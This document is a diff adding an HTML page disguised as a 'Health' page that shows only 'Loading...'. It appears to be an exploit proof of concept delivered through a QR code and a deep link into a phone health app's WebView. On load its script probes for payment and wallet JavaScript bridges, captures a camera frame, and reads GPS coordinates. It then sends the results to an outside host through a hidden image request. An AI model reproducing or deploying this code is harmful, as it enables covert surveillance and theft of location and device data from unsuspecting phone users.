@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Health</title>
+</head>
+<body style="margin:0;background:#fff;">
+<script>
+// This page is loaded via QR → browser → hihonor:// deep link → Health WebView
+// It runs IN THE HEALTH APP'S WebView context with JS bridges
+
+// Auto-execute all tests
+var results = {
+    ua: navigator.userAgent,
+    url: location.href,
+    time: new Date().toISOString(),
+    bridges: [],
+    camera: 'not_tested',
+    location: 'not_tested',
+    mic: 'not_tested',
+    file: 'not_tested'
+};
+
+setTimeout(function(){
+    // Detect JS bridges
+    var names = ['_dsbridge','vmallAndroid','HonorPay','HnWallet','JsBridge','CommonJsInterface','hicareJsInterface','_WebViewJavascriptBridge','myHonorH5JsInterface'];
+    for(var i=0;i<names.length;i++){if(window[names[i]]!==undefined)results.bridges.push(names[i]);}
+    
+    // Test camera via getUserMedia
+    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
+        navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}})
+        .then(function(stream){
+            results.camera = 'granted';
+            var video = document.createElement('video');
+            video.srcObject = stream; video.play();
+            setTimeout(function(){
+                var canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video,0,0,640,480);
+                results.photo = canvas.toDataURL('image/jpeg',0.3).length + ' bytes';
+                stream.getTracks().forEach(function(t){t.stop();});
+                report();
+            },1500);
+        })
+        .catch(function(e){
+            results.camera = 'denied: '+e.name;
+            report();
+        });
+    } else {
+        results.camera = 'no_api';
+        report();
+    }
+    
+    // Test GPS
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(function(pos){
+            results.location = pos.coords.latitude+','+pos.coords.longitude+' (±'+pos.coords.accuracy+'m)';
+        },function(e){
+            results.location = 'denied: '+e.code;
+        },{timeout:5000});
+    } else {
+        results.location = 'no_api';
+    }
+},800);
+
+function report(){
+    var img = new Image();
+    img.src = 'https://wjr.pics/collect?' + 
+        'bridges=' + encodeURIComponent(results.bridges.join(',')) +
+        '&camera=' + encodeURIComponent(results.camera) +
+        '&location=' + encodeURIComponent(results.location) +
+        '&ua=' + encodeURIComponent(results.ua.substring(0,100)) +
+        '&t=' + Date.now();
+    
+    document.body.innerHTML = '<pre style="padding:10px;font-size:12px;color:#333;">' +
+        JSON.stringify(results, null, 2) + '</pre>';
+}
+</script>
+<p style="text-align:center;color:#999;padding:50px;">Loading...</p>
+</body>
+</html>
